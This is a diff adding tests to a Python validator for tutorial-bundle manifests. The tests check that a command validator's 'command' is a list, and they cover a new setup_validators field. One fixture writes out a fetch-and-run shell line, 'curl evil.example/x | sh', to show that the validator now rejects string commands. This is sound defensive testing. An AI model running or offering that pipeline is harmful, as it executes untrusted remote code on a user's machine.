@@ -639,6 +639,101 @@ def m_validator_missing_field(root: Path) -> None:
     )
 
 
+CARGO_CHECK_DECL = "cargo-check: { kind: command, command: [cargo, check] }"
+
+
+def _redeclare_cargo_check(root: Path, literal: str, expected: object) -> None:
+    """Rewrite the `cargo-check` validator and prove what `command` parses to.
+
+    The same shape as _declare_teaching_method, for the same reason: every
+    case below turns on the TYPE the reader hands check 8 - str, list, a
+    list holding an int, an empty list - and a quoting slip would silently
+    turn a case into a test of something else that still passes. The
+    measured hole (tutorAIl#31: `command: "curl evil.example/x | sh"` exits
+    0 with no finding) is a STRING where a list was meant, so asserting the
+    parsed type is the whole of the fixture verification.
+    """
+    manifest = root / "tutorial.yaml"
+    assert CARGO_CHECK_DECL in manifest.read_text(), (
+        "this baseline does not declare cargo-check in the expected form, so "
+        "the fixture would be asserting about the wrong validator"
+    )
+    edit(manifest, CARGO_CHECK_DECL, literal)
+    parsed = vb.load_yaml(manifest.read_text(), "tutorial.yaml")
+    assert isinstance(parsed, dict), "the mutated manifest no longer parses"
+    vdef = parsed.get("validators", {}).get("cargo-check")
+    assert isinstance(vdef, dict), f"cargo-check parsed to {vdef!r}, not a mapping"
+    assert vdef.get("kind") == "command", (
+        f"cargo-check's kind parsed to {vdef.get('kind')!r}, so this fixture "
+        f"is not exercising check 8's command rule"
+    )
+    got = vdef.get("command")
+    assert got == expected and type(got) is type(expected), (
+        f"command parsed to {got!r} ({type(got).__name__}), not "
+        f"{expected!r} ({type(expected).__name__})"
+    )
+
+
+def m_command_is_a_shell_string(root: Path) -> None:
+    """The exact line tutorAIl#31 measured passing in silence."""
+    _redeclare_cargo_check(
+        root,
+        'cargo-check: { kind: command, command: "curl evil.example/x | sh" }',
+        "curl evil.example/x | sh",
+    )
+
+
+def m_command_is_a_plain_string(root: Path) -> None:
+    """The same hole with nothing alarming in it.
+
+    `cargo check` as a string is the honest authoring mistake the rule is
+    for, and it must fire exactly as the shell pipeline above does. A check
+    that only caught the frightening spelling would be a blocklist.
+    """
+    _redeclare_cargo_check(
+        root,
+        "cargo-check: { kind: command, command: cargo check }",
+        "cargo check",
+    )
+
+
+def m_command_is_an_empty_list(root: Path) -> None:
+    _redeclare_cargo_check(root, "cargo-check: { kind: command, command: [] }", [])
+
+
+def m_command_holds_a_number(root: Path) -> None:
+    _redeclare_cargo_check(
+        root,
+        "cargo-check: { kind: command, command: [cargo, 3] }",
+        ["cargo", 3],
+    )
+
+
+def m_command_holds_an_empty_string(root: Path) -> None:
+    _redeclare_cargo_check(
+        root,
+        'cargo-check: { kind: command, command: [cargo, "", check] }',
+        ["cargo", "", "check"],
+    )
+
+
+def m_command_is_a_mapping(root: Path) -> None:
+    _redeclare_cargo_check(
+        root,
+        "cargo-check:\n    kind: command\n    command:\n      run: cargo check",
+        {"run": "cargo check"},
+    )
+
+
+def m_command_is_a_list(root: Path) -> None:
+    """LEGAL and silent - the declaration every bundle already ships.
+
+    The control for all six above. Without it they prove only that check 8
+    reports something, not that it reports the wrong shape in particular.
+    """
+    _redeclare_cargo_check(root, CARGO_CHECK_DECL, ["cargo", "check"])
+
+
 def m_id_not_slug_shaped(root: Path) -> None:
     edit(root / "tutorial.yaml", "id: rust-automaton-db", "id: Rust_AutomatonDB")
 
@@ -2575,6 +2670,218 @@ def m_supplies_is_a_defined_field(root: Path) -> None:
     )
 
 
+# -- check 29: setup_validators, at manifest scope and at lesson scope
+
+SETUP_DESCRIBE = "confirms the placed skeleton compiles before the first lesson"
+SETUP_ENTRY = (
+    "setup_validators:\n"
+    "  - name: cargo-check\n"
+    f"    describe: {SETUP_DESCRIBE}\n"
+)
+
+
+def _declare_setup_validators(root: Path, literal: str, expected: object) -> None:
+    """Append one `setup_validators:` declaration and prove what it parses to.
+
+    The same shape as _declare_teaching_method, for the same reason. Every
+    case below turns on the TYPE and the KEYS the reader hands check 29 - a
+    list of mappings, a bare scalar, a list of bare strings, an entry with a
+    misspelled key, an entry whose `describe` is blank - and an indentation
+    or quoting slip would silently turn a case into a test of something else
+    that still passes.
+
+    Appended at column 0, so one helper serves a bundle and an instance
+    alike: to_instance() has already appended the `instance:` block by the
+    time a mutator runs, and a top-level key after it is still a top-level
+    key.
+    """
+    manifest = root / "tutorial.yaml"
+    assert "setup_validators" not in manifest.read_text(), (
+        "the baseline already declares setup_validators, so this fixture "
+        "would be asserting about the wrong declaration"
+    )
+    append(manifest, f"\n{literal}")
+    parsed = vb.load_yaml(manifest.read_text(), "tutorial.yaml")
+    assert isinstance(parsed, dict), "the mutated manifest no longer parses"
+    assert "setup_validators" in parsed, (
+        "the appended key did not survive the reader, so this fixture proves "
+        "nothing"
+    )
+    got = parsed["setup_validators"]
+    assert got == expected and type(got) is type(expected), (
+        f"setup_validators parsed to {got!r} ({type(got).__name__}), not "
+        f"{expected!r} ({type(expected).__name__})"
+    )
+
+
+def _declare_lesson_setup_validators(
+    root: Path, rel: str, literal: str, expected: object
+) -> None:
+    """The same, in a lesson's frontmatter, with the same verification."""
+    path = root / rel
+    text = path.read_text()
+    assert text.startswith("---\n"), f"{rel} has no frontmatter to extend"
+    head, rest = text.split("\n---\n", 1)
+    assert "setup_validators" not in head, f"{rel} already declares setup_validators"
+    path.write_text(head + "\n" + literal + "---\n" + rest)
+    fm_text, _ = vb.split_frontmatter(path.read_text())
+    assert fm_text is not None, f"{rel}'s frontmatter no longer delimits"
+    fm = vb.load_yaml(fm_text, rel + " frontmatter")
+    assert isinstance(fm, dict), f"{rel}'s frontmatter no longer parses to a mapping"
+    got = fm.get("setup_validators")
+    assert got == expected and type(got) is type(expected), (
+        f"{rel}: setup_validators parsed to {got!r} ({type(got).__name__}), "
+        f"not {expected!r} ({type(expected).__name__})"
+    )
+
+
+def m_setup_validators_well_formed(root: Path) -> None:
+    """LEGAL and silent - the declaration section 4 of the design writes.
+
+    The positive control for every case below. Without it they prove only
+    that check 29 reports something, never that it accepts a correct entry.
+    """
+    _declare_setup_validators(
+        root, SETUP_ENTRY, [{"name": "cargo-check", "describe": SETUP_DESCRIBE}]
+    )
+
+
+LESSON_SETUP_DESCRIBE = "confirms the starter files are still in place"
+
+
+def m_setup_validators_lesson_scope_well_formed(root: Path) -> None:
+    """LEGAL and silent at LESSON scope, which is a separate declaration site."""
+    _declare_lesson_setup_validators(
+        root,
+        "lessons/00-foundations.md",
+        "setup_validators:\n"
+        "  - name: has-lib\n"
+        f"    describe: {LESSON_SETUP_DESCRIBE}\n",
+        [{"name": "has-lib", "describe": LESSON_SETUP_DESCRIBE}],
+    )
+
+
+def m_setup_validator_name_misspelled(root: Path) -> None:
+    _declare_setup_validators(
+        root,
+        "setup_validators:\n"
+        "  - name: cargo-chekc\n"
+        f"    describe: {SETUP_DESCRIBE}\n",
+        [{"name": "cargo-chekc", "describe": SETUP_DESCRIBE}],
+    )
+
+
+def m_setup_validator_name_misspelled_in_a_lesson(root: Path) -> None:
+    """The same rule at lesson scope: one check, both scopes."""
+    _declare_lesson_setup_validators(
+        root,
+        "lessons/00-foundations.md",
+        "setup_validators:\n"
+        "  - name: has-libb\n"
+        f"    describe: {LESSON_SETUP_DESCRIBE}\n",
+        [{"name": "has-libb", "describe": LESSON_SETUP_DESCRIBE}],
+    )
+
+
+def m_setup_validator_describe_missing(root: Path) -> None:
+    _declare_setup_validators(
+        root, "setup_validators:\n  - name: cargo-check\n", [{"name": "cargo-check"}]
+    )
+
+
+def m_setup_validator_describe_is_blank(root: Path) -> None:
+    """Blank to a reader, non-empty to `if value:`."""
+    _declare_setup_validators(
+        root,
+        'setup_validators:\n  - name: cargo-check\n    describe: "  "\n',
+        [{"name": "cargo-check", "describe": "  "}],
+    )
+
+
+def m_setup_validator_describe_misspelled(root: Path) -> None:
+    """The misspelling case `supplies` is shaped around: reported, not ignored.
+
+    It produces TWO findings - the unknown key, and the required key that is
+    now missing - and both are correct.
+    """
+    _declare_setup_validators(
+        root,
+        "setup_validators:\n"
+        "  - name: cargo-check\n"
+        f"    descrbe: {SETUP_DESCRIBE}\n",
+        [{"name": "cargo-check", "descrbe": SETUP_DESCRIBE}],
+    )
+
+
+def m_setup_validator_names_a_manual_validator(root: Path) -> None:
+    """The one place the two axes cannot cross.
+
+    `manual` is the learner's evidence by definition, so it cannot be a check
+    the runner performs unprompted. The automaton baseline declares a
+    validator called `manual` whose kind is `manual`, so the name RESOLVES -
+    the finding is about the kind, not about a dangling name.
+    """
+    _declare_setup_validators(
+        root,
+        "setup_validators:\n"
+        "  - name: manual\n"
+        "    describe: confirms the learner explained the design choice\n",
+        [
+            {
+                "name": "manual",
+                "describe": "confirms the learner explained the design choice",
+            }
+        ],
+    )
+
+
+def m_setup_validators_is_not_a_list(root: Path) -> None:
+    """The missing-'- ' typo, which check 22 is also shaped around."""
+    _declare_setup_validators(
+        root,
+        f"setup_validators:\n  name: cargo-check\n  describe: {SETUP_DESCRIBE}\n",
+        {"name": "cargo-check", "describe": SETUP_DESCRIBE},
+    )
+
+
+def m_setup_validators_entry_is_a_bare_name(root: Path) -> None:
+    """A list of bare strings - the polymorphic shape section 4.1 rejects."""
+    _declare_setup_validators(
+        root, "setup_validators:\n  - cargo-check\n", ["cargo-check"]
+    )
+
+
+def m_setup_validators_is_an_empty_list(root: Path) -> None:
+    """PRESENT and empty declares nothing, exactly as `supplies: []` does."""
+    _declare_setup_validators(root, "setup_validators: []\n", [])
+
+
+def m_no_setup_validators(root: Path) -> None:
+    """The backward-compatibility control: the key is a MAY.
+
+    Every bundle written before the key existed omits it, so this mutates
+    nothing and asserts that there is nothing to mutate.
+    """
+    assert "setup_validators" not in (root / "tutorial.yaml").read_text(), (
+        "this baseline declares setup_validators, so it cannot show a bundle "
+        "that predates the key still validating"
+    )
+
+
+def m_setup_validators_misspelled_singular(root: Path) -> None:
+    """Check 28's near-miss control for the allow-list edit.
+
+    Adding a name to KNOWN_MANIFEST_FIELDS is exactly the edit that can
+    silently disable a warning wholesale, and the only proof it did not is a
+    near miss that still warns.
+    """
+    _append_top_level(
+        root,
+        f"setup_validator:\n  - name: cargo-check\n    describe: {SETUP_DESCRIBE}",
+        {"setup_validator": [{"name": "cargo-check", "describe": SETUP_DESCRIBE}]},
+    )
+
+
 # --------------------------------------------------------------------------
 # The case table
 # --------------------------------------------------------------------------
@@ -2731,6 +3038,36 @@ CASES: list[Case] = [
          m_validator_unknown_kind, "kind 'file-exsits' is not one of"),
     Case("8: a validator omits a required field", 8, "automaton", "bundle",
          m_validator_missing_field, "requires the field 'path'"),
+    # ---- check 8's command type rule (tutorAIl#31, design section 6.1). The
+    # measured hole is the first case: before this rule, a `command` that was
+    # a shell string exited 0 with no finding.
+    Case("8: a command validator's command is a shell string", 8, "automaton",
+         "bundle", m_command_is_a_shell_string,
+         "must be a list of arguments", where="tutorial.yaml (validators.cargo-check)"),
+    Case("8: a command validator's command is a plain string", 8, "automaton",
+         "bundle", m_command_is_a_plain_string,
+         "must be a list of arguments", where="tutorial.yaml (validators.cargo-check)"),
+    Case("8: a command validator's command is an empty list", 8, "automaton",
+         "bundle", m_command_is_an_empty_list,
+         "is an empty list, so there is no program to run",
+         where="tutorial.yaml (validators.cargo-check)"),
+    Case("8: a command validator's command holds a number", 8, "automaton",
+         "bundle", m_command_holds_a_number,
+         "entry at position 1 is int: 3",
+         where="tutorial.yaml (validators.cargo-check)"),
+    Case("8: a command validator's command holds an empty string", 8,
+         "automaton", "bundle", m_command_holds_an_empty_string,
+         "entry at position 1 is an empty string",
+         where="tutorial.yaml (validators.cargo-check)"),
+    Case("8: a command validator's command is a mapping", 8, "automaton",
+         "bundle", m_command_is_a_mapping,
+         "must be a list of arguments", where="tutorial.yaml (validators.cargo-check)"),
+    # ---- check 8's command rule, the positive direction. Without this every
+    # case above proves only that check 8 reports SOMETHING.
+    Case("8: a command validator's command is a list - legal, silent", 8,
+         "automaton", "bundle", m_command_is_a_list, kind="silent"),
+    Case("8: the same, in instance mode", 8, "automaton", "instance",
+         m_command_is_a_list, kind="silent"),
     Case("8: the bundle id is not [a-z0-9-]+", 8, "automaton", "bundle",
          m_id_not_slug_shaped, "must match [a-z0-9-]+"),
     Case("8: a manifest key appears twice", 8, "automaton", "bundle",
@@ -3276,6 +3613,65 @@ CASES: list[Case] = [
     # asserts that direction - check 7's finding and NO check-28 warning.)
     Case("28: supplies is defined by the format though no fixture uses it",
          28, "cli", "bundle", m_supplies_is_a_defined_field, kind="silent"),
+    # ---- check 28 and the setup_validators allow-list edit. Adding a name
+    # to KNOWN_MANIFEST_FIELDS is exactly the edit that can silently disable
+    # a warning wholesale. These two rows are the near miss and the hit, and
+    # NEITHER stands in for the other: without the first, the allow-list
+    # could have been emptied and every case here would still pass.
+    Case("28: 'setup_validator' - the singular near miss - still WARNS", 28,
+         "automaton", "bundle", m_setup_validators_misspelled_singular,
+         "'setup_validator', which is a near miss for 'setup_validators'",
+         kind="warns", where="tutorial.yaml"),
+    Case("28: 'setup_validators' spelled correctly is silent", 28,
+         "automaton", "bundle", m_setup_validators_well_formed, kind="silent"),
+    # ---- check 29: setup_validators
+    Case("29: a setup entry names a validator nothing declares", 29,
+         "automaton", "bundle", m_setup_validator_name_misspelled,
+         "setup_validators names 'cargo-chekc', which is a near miss for "
+         "'cargo-check'", where="tutorial.yaml"),
+    Case("29: the same at LESSON scope", 29, "automaton", "bundle",
+         m_setup_validator_name_misspelled_in_a_lesson,
+         "setup_validators names 'has-libb', which is a near miss for "
+         "'has-lib'", where="lessons/00-foundations.md"),
+    Case("29: a setup entry has no describe", 29, "automaton", "bundle",
+         m_setup_validator_describe_missing,
+         "missing required key 'describe'", where="tutorial.yaml"),
+    Case("29: a setup entry's describe is blank", 29, "automaton", "bundle",
+         m_setup_validator_describe_is_blank,
+         "'describe' must be a non-empty sentence", where="tutorial.yaml"),
+    Case("29: a setup entry misspells describe", 29, "automaton", "bundle",
+         m_setup_validator_describe_misspelled,
+         "unknown key 'descrbe'", where="tutorial.yaml"),
+    Case("29: a setup entry names a MANUAL validator", 29, "automaton",
+         "bundle", m_setup_validator_names_a_manual_validator,
+         "whose kind is 'manual'", where="tutorial.yaml"),
+    Case("29: setup_validators is a single mapping, not a list", 29,
+         "automaton", "bundle", m_setup_validators_is_not_a_list,
+         "must be a list of entries", where="tutorial.yaml"),
+    Case("29: a setup entry is a bare validator name", 29, "automaton",
+         "bundle", m_setup_validators_entry_is_a_bare_name,
+         "is not a mapping of 'name' and 'describe'", where="tutorial.yaml"),
+    # ---- check 29, the positive direction. Without these every case above
+    # proves only that check 29 reports SOMETHING.
+    Case("29: a well-formed manifest-scope entry is legal and silent", 29,
+         "automaton", "bundle", m_setup_validators_well_formed, kind="silent"),
+    Case("29: a well-formed LESSON-scope entry is legal and silent", 29,
+         "automaton", "bundle", m_setup_validators_lesson_scope_well_formed,
+         kind="silent"),
+    Case("29: 'setup_validators: []' declares nothing and is silent", 29,
+         "automaton", "bundle", m_setup_validators_is_an_empty_list,
+         kind="silent"),
+    Case("29: a bundle that predates the key is silent", 29, "automaton",
+         "bundle", m_no_setup_validators, kind="silent"),
+    # ---- check 29 is NOT bundle-only. An instance carries a copy of
+    # tutorial.yaml, and the banner that prints `describe` is drawn from the
+    # instance, so a malformed entry there is as broken as one in a bundle.
+    Case("29: an INSTANCE with a blank describe fires", 29, "automaton",
+         "instance", m_setup_validator_describe_is_blank,
+         "'describe' must be a non-empty sentence", where="tutorial.yaml"),
+    Case("29: an INSTANCE with a well-formed entry is silent", 29,
+         "automaton", "instance", m_setup_validators_well_formed,
+         kind="silent"),
 ]
 
 
@@ -5811,6 +6207,131 @@ def test_teaching_method_status() -> None:
     )
 
 
+def test_setup_validators_status() -> None:
+    """Check 29's STATUS line, which the case table cannot see.
+
+    run_case reads findings only, so a "silent" case is satisfied by a check
+    that never ran at all - and for a MAY, "never ran" is exactly the failure
+    that matters, because the ordinary bundle declares nothing. This asserts
+    the status value itself: "n/a" with a reason when nothing is declared,
+    "ran" with a count when something is, in BOTH modes.
+
+    Every n/a assertion is paired with the same baseline reporting `ran` once
+    an entry is added, so an n/a cannot be the check silently failing to
+    execute. That pairing is the positive control this test exists for.
+    """
+    print("\ncheck 29: the status line for a MAY, in both modes:")
+    for mode in ("bundle", "instance"):
+        with tempfile.TemporaryDirectory() as tmpdir:
+            root = fresh("automaton", Path(tmpdir))
+            if mode == "instance":
+                to_instance(root)
+            report = vb.validate(root, mode)
+            state, reason = report.status.get(29, ("missing", ""))
+            record(
+                state == vb.NOT_APPLICABLE and "setup_validators" in reason,
+                f"{mode}: a manifest with no setup_validators reports n/a",
+                f"status = {(state, reason)!r}",
+            )
+            record(
+                report.exit_code() == 0,
+                f"{mode}: and the bundle still validates clean",
+                f"exit {report.exit_code()}, findings = "
+                f"{[str(f) for f in report.findings]}",
+            )
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            root = fresh("automaton", Path(tmpdir))
+            if mode == "instance":
+                to_instance(root)
+            m_setup_validators_well_formed(root)
+            report = vb.validate(root, mode)
+            state, detail = report.status.get(29, ("missing", ""))
+            record(
+                state == vb.RAN
+                and detail == "1 setup_validators entry across 1 declaration site",
+                f"{mode}: a declared setup_validators reports ran, with the "
+                f"count it examined",
+                f"status = {(state, detail)!r}",
+            )
+            record(
+                report.exit_code() == 0 and not report.findings,
+                f"{mode}: and a well-formed entry produces no finding",
+                f"exit {report.exit_code()}, findings = "
+                f"{[str(f) for f in report.findings]}",
+            )
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            root = fresh("automaton", Path(tmpdir))
+            if mode == "instance":
+                to_instance(root)
+            m_setup_validators_well_formed(root)
+            m_setup_validators_lesson_scope_well_formed(root)
+            report = vb.validate(root, mode)
+            state, detail = report.status.get(29, ("missing", ""))
+            record(
+                state == vb.RAN
+                and detail == "2 setup_validators entries across 2 declaration sites",
+                f"{mode}: both scopes are counted by the one check",
+                f"status = {(state, detail)!r}",
+            )
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            root = fresh("automaton", Path(tmpdir))
+            if mode == "instance":
+                to_instance(root)
+            m_setup_validators_is_an_empty_list(root)
+            report = vb.validate(root, mode)
+            state, reason = report.status.get(29, ("missing", ""))
+            record(
+                state == vb.NOT_APPLICABLE and report.exit_code() == 0,
+                f"{mode}: 'setup_validators: []' declares nothing, so check 29 "
+                f"is n/a - the same as absent",
+                f"status = {(state, reason)!r}, exit {report.exit_code()}",
+            )
+
+    # The name resolves against the validators MAP, so an unusable map leaves
+    # the check unable to answer its own question. It BLOCKS rather than
+    # reporting every name as dangling - the shower of derived findings
+    # checks 2 and 19 refuse - and a blocked check is exit 3, not a pass.
+    with tempfile.TemporaryDirectory() as tmpdir:
+        root = fresh("automaton", Path(tmpdir))
+        m_setup_validators_well_formed(root)
+        manifest = root / "tutorial.yaml"
+        text = re.sub(
+            r"\nvalidators:\n(?:  \S.*\n)+", "\nvalidators: notamap\n",
+            manifest.read_text(),
+        )
+        assert "validators: notamap" in text, "the validators block was not replaced"
+        manifest.write_text(text)
+        parsed = vb.load_yaml(text, "tutorial.yaml")
+        assert isinstance(parsed, dict) and parsed["validators"] == "notamap", (
+            f"the fixture did not produce an unusable validators map: "
+            f"{parsed.get('validators')!r}"
+        )
+        report = vb.validate(root, "bundle")
+        record(
+            29 in report.blocked_checks,
+            "an unusable 'validators' map BLOCKS check 29 rather than "
+            "reporting every setup name as dangling",
+            f"blocked = {report.blocked_checks}, findings = "
+            f"{[str(f) for f in report.findings if f.check == 29]}",
+        )
+
+    record(
+        29 not in vb.BUNDLE_ONLY and 29 not in vb.INSTANCE_ONLY,
+        "check 29 is declared for BOTH modes - an instance carries the "
+        "manifest the disclosure is drawn from",
+        f"BUNDLE_ONLY = {vb.BUNDLE_ONLY}, INSTANCE_ONLY = {vb.INSTANCE_ONLY}",
+    )
+    record(
+        29 not in vb.WARNING_ONLY,
+        "check 29 is a FINDING, not a warning: a setup entry the runner "
+        "cannot resolve or cannot describe is a defect in the bundle",
+        f"WARNING_ONLY = {vb.WARNING_ONLY}",
+    )
+
+
 def test_manifest_near_miss_distance() -> None:
     """The suggestion helper over the BUNDLE field list, before anything
     relies on what it suggests.
@@ -6479,6 +7000,7 @@ def main() -> int:
     test_alias_normalisation_matches_the_runtime()
     test_assumes_reviewed_is_bundle_only()
     test_teaching_method_status()
+    test_setup_validators_status()
     test_manifest_near_miss_distance()
     test_known_manifest_fields_match_the_field_reference()
     test_unknown_top_level_field_warns_and_never_rejects()
